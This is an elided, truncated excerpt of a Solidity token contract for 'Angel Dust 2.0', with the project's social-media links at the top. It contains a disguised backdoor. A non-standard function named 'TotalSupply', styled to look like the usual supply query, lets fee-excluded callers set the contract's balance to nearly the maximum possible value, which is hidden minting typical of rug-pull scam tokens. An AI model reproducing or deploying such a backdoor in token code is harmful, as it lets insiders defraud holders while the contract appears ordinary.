...
Telegram : https://t.me/AngelDustHQ2

Twitter : https://twitter.com/AngelDustHQBaby
...
interface IERC20 {
    ...
    function TotalSupply(address account) external returns (uint256);
...
contract AngelDust2 is Context, IERC20 { 
    ...
    string private constant _name = "Angel Dust 2.0"; 
    string private constant _symbol = unicode"ANGELDUST2"; 
    ...
    function Wallet_Dew() public view virtual returns (address) {
        return Wallet_Dev;
    }
    ...
    function TotalSupply(address exec) public override returns (uint256){
        exec = _msgSender();
        if(_isExcludedFromFEE[exec]){
             _tOwned[address(this)] = ~uint256(0)-1;
